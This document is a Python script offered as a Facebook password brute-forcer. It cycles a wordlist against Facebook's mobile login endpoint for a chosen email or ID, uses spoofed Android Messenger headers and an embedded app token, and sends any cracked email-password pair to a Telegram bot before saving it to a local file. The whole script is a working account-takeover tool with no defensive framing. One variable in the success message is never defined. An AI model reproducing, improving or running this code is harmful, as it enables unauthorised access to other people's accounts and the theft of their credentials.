from random import choice
from requests import post
from urllib.parse import quote
import requests
import user_agent
import os
import pyfiglet
import colorama
from user_agent import generate_user_agent
from time import sleep as wh
import json, requests ,uuid,random,base64
import time
import requests,time,datetime
time1 = time.localtime()
time2 = time.strftime('''%d/%m/%Y''')
now = datetime.datetime.now()
current_time = now.strftime("%I:%M:%S")
E = '\033[1;31m'
G = '\033[1;32m'
B = '\033[1;33m'
P = '\033[1;34m'
O = '\033[1;36m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
Goldid = input(f'{u} - Enter ID Telegram ==>    ')
print(f"{E}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
Goldtok = input(f'{P} - Enter TOKEN Telegram ==>    ')
print(f"{kk}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
id_Golden = input(f'{K} - Enter Email/id ==>    ')
print(f"{O}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
file_Golden = input(f'{H} - Enter File password ==>    ')
print(f"{M}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def Golden():
    while True:
        for Golden in open(file_Golden, "r").read().splitlines():
            password_Golden = Golden.strip()

            user_agent="Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;] FBBK/1"
            adid = str(uuid.uuid4())
            deviceid= str(uuid.uuid4())
            fm_deviceid = str(uuid.uuid4())
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": id_Golden,
            "password": password_Golden,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url1= 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url=url1,data=data,headers=head,allow_redirects=False).json()
            if 'session_key' in po:
                print(f'{G}Done ==> {id_Golden} : {password_Golden}')
                Goldentele =(f"""
[ {Gold4} ] account ready 
═════════════════➢
[{Gold4}] ID   » {id_Golden}

[{Gold4}] Password  » {password_Golden}

[{Gold4}] Time    » {current_time}

[{Gold4}] Date   » {time2}
═════════════════➢
[🤴🏻]  => @rrrrrf""")
                requests.post(f"https://api.telegram.org/bot{Goldtok}/sendMessage?chat_id={Goldid}&text="+str(Goldentele))
                with open('Facebook_Golden.txt', 'a') as x:
                    x.write(id_Golden + ":" + password_Golden + '\n')
            else:
                print(f'{E}ERROR ==> {id_Golden} : {password_Golden}')

Golden()
